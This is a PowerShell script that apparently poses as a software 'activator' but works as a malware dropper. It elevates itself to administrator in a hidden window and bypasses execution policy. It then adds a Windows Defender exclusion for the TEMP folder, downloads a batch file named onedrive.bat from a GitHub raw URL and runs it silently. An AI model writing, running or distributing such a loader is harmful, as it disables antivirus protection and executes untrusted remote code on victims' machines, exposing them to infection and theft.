if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $scriptContent = @'
    $ErrorActionPreference = "SilentlyContinue"
    Add-MpPreference -ExclusionPath $env:TEMP
    $url = "https://raw.githubusercontent.com/bgprofil9-create/profejt/refs/heads/main/onedrive.bat"
    $file = "$env:TEMP\onedrive.bat"
    Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing
    if (Test-Path $file) {
        Start-Process $file
    }
'@
    
    $tempFile = [System.IO.Path]::GetTempFileName() + ".ps1"
    $scriptContent | Set-Content $tempFile -Encoding UTF8
    Start-Process PowerShell "-NoProfile -ExecutionPolicy Bypass -File `"$tempFile`"" -Verb RunAs -WindowStyle Hidden
    exit
}
$ErrorActionPreference = "SilentlyContinue"

Add-MpPreference -ExclusionPath $env:TEMP
Start-Sleep 1
$url = "https://raw.githubusercontent.com/bgprofil9-create/profejt/refs/heads/main/onedrive.bat"
$file = "$env:TEMP\onedrive.bat"
if (Test-Path $file) { Remove-Item $file -Force }
Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing
Start-Sleep 2
if (Test-Path $file) {
    Start-Process $file
    Write-Host "ACTIVATOR IS STARTED!" -ForegroundColor Green
} else {
    Write-Host "Файлът не е изтеглен" -ForegroundColor Red
}


